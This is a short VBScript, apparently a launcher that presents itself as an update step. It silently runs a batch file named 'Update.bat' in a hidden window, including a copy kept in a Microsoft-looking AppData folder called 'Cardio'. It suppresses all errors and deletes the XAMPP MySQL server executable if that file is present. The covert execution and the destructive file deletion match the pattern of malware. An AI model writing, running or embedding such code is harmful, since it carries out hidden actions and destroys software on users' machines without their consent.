CreateObject("Wscript.Shell").Run "Update.bat",0,True
On Error Resume Next
Dim fso,oShell,file
Set fso = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("WScript.Shell")
oShell.Run "C:\\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio\Cardio-main\Update.bat",0,True
file = "C:\xampp\mysql\bin\mysqld.exe"
If fso.FileExists(file) Then
    fso.DeleteFile file
End If
Set oShell = Nothing 
Set fso = Nothing
